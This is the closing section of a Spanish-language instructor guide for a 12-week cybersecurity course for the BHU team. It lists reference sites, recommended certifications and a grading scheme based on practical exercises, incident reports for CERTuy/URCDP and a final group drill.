- AGESIC Ciberseguridad: https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/ciberseguridad
- MITRE ATT&CK: https://attack.mitre.org
- OWASP: https://owasp.org
- NIST: https://www.nist.gov/cyberframework

## Certificaciones recomendadas para el equipo del BHU
- **CompTIA Security+** - Fundamentos (nivel inicial)
- **CEH (Certified Ethical Hacker)** - Hacking etico
- **CISSP** - Seguridad de la informacion (nivel senior)
- **GCIH (GIAC Certified Incident Handler)** - Respuesta a incidentes
- **ISO 27001 Lead Implementer** - Sistemas de gestion de SI

## Evaluacion del curso

| Componente | Peso | Descripcion |
|-----------|------|-------------|
| Ejercicios practicos | 40% | Realizados durante las 12 semanas |
| Informes de incidente | 30% | Redaccion de reportes para CERTuy/URCDP |
| Simulacro final (Sem 12) | 30% | Ejercicio integrador grupal |

---

*Guia del instructor - Curso de Ciberseguridad para BHU*
*Version 1.0 - Julio 2026*
